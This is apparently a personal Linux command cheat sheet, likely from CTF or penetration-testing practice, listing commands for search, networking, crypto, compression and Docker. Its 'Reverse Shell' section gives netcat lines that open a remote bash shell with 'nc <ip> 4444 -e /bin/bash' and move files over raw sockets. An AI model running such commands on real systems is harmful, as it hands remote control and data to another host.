## Search and Navigation
- `pwd` : Display the current working directory.
- `lsblk` : List mounted disks and partitions.
- `locate <file_name>` : Search for a file in the system.
- `which <command_name>` : Show the path of a command's executable.
- `history` : Display the history of executed commands.
- `find / -name "*...*" 2>/dev/null`: Search a file in the system 

## Networking & Services
- `telnet <host> 80` : Test connection to a service.
- `finger @<ip>` : List the users on a remote machine.
- `finger fabiano@<ip>` : Get specific information about a user.
- `wget -r -np -nH --cut-dirs=0 http://192.168.1.100:8000/` : Download all files/folders from a directory hosted on a Python web server.
- `ss -tulpn`: Display all the open port.

## System
- `kill {pid}`: Kill a process.
- `export VAR=value` : Create or modify an environment variable and make it available to child processes.

## Crypto & Certificates
- `openssl x509 -in key.pem -text -noout` : Analyze a X.509 certificate.
- `gpg --homedir /your/path/to/gpg_key -d file.gpg` : Decrypt a GPG-encrypted file (requires the corresponding private key or passphrase).  
- `gpg --encrypt -r <recipient> file.txt` : Encrypt a file for a specific recipient using their public key.

## Databases--homedir
- `sqlite3 filedb.sqlite` : Start an SQLite session on a `.sqlite` file.

## File
- `file <file_name>` : Display the file type.
- `ln -s /path/to/target /path/to/symlink`: Creat a symlink.

## Reverse Shell
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Upgrade a reverse shell to a fully interactive shell.
- `nc -lvnp 4444`: Open port 4444
- `nc <ip> 4444 > file.txt`: Connect to a port on another machine and save the received data into file.txt 
- `nc -lvnp 4444 < file.txt`: Listen on port 4444 and send the contents of file.txt to any connected client.
- `nc <ip> 4444 -e /bin/bash`: Connect to the reverse shell with nc

## Compression & Decompression
- `tar -cf archive.tar folder/` : Create a TAR archive without compression.  
- `tar -xf archive.tar` : Extract a TAR archive without compression.  
- `tar -czf archive.tar.gz folder/` : Create a TAR archive compressed with Gzip.  
- `tar -xzf archive.tar.gz` : Extract a TAR archive compressed with Gzip.  
- `tar -cjf archive.tar.bz2 folder/` : Create a TAR archive compressed with Bzip2.  
- `tar -xjf archive.tar.bz2` : Extract a TAR archive compressed with Bzip2.  
- `tar -cJf archive.tar.xz folder/` : Create a TAR archive compressed with XZ.  
- `tar -xJf archive.tar.xz` : Extract a TAR archive compressed with XZ.  
- `gzip file.txt` : Compress a single file with Gzip, replacing the original file.  
- `gunzip file.txt.gz` : Decompress a Gzip file.  
- `bzip2 file.txt` : Compress a single file with Bzip2, replacing the original file.  
- `bunzip2 file.txt.bz2` : Decompress a Bzip2 file.  
- `xz file.txt` : Compress a single file with XZ, replacing the original file.  
- `unxz file.txt.xz` : Decompress an XZ file.  
- `zip -r archive.zip folder/` : Create a ZIP archive containing a folder and its contents. 
- `unzip archive.zip` : Extract the contents of a ZIP archive.  

## Docker
- `docker ps` : List all running containers.
- `docker ps -a` : List all containers (running and stopped).
- `docker images` : List all available Docker images.
- `docker build -t <image_name> .` : Build an image from a Dockerfile in the current directory.
- `docker run -it --rm <image_name>` : Run a container interactively and remove it after exit.
- `docker run -d --name <container_name> <image_name>` : Run a container in detached mode with a specific name.
- `docker exec -it <container_name> /bin/bash` : Open an interactive shell inside a running container.
- `docker stop <container_name>` : Stop a running container.
- `docker start <container_name>` : Start a stopped container.
- `docker restart <container_name>` : Restart a container.
- `docker rm <container_name>` : Remove a stopped container.
- `docker rmi <image_name>` : Remove a Docker image.
- `docker logs <container_name>` : Show the logs of a container.
- `docker inspect <container_name>` : Show detailed information about a container.
- `docker cp <container_name>:/path/in/container /path/on/host` : Copy a file from a container to the host.
- `docker cp /path/on/host <container_name>:/path/in/container` : Copy a file from the host to a container.
- `docker-compose up -d` : Start all services defined in a `docker-compose.yml` in detached mode.
- `docker-compose down` : Stop and remove containers, networks, and volumes created by `docker-compose up`.
- `docker system prune -a` : Remove all stopped containers, unused images, and unused networks.



